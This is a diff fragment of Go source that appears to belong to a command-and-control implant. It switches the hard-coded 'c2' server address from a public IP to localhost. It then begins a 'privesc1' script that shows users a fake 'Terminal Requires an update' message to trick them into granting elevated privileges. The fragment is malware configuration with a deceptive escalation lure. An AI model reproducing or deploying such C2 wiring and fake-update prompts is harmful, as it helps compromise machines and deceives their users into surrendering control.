@@ -202,7 +202,7 @@ type Cmd struct {
 }
 
 var timeoutSetting = 1
-var c2 = "http://34.216.56.187"
+var c2 = "http://127.0.0.1:8005"
 
 var privesc1 = `echo "Terminal Requires an update to contine."
 sleep 1
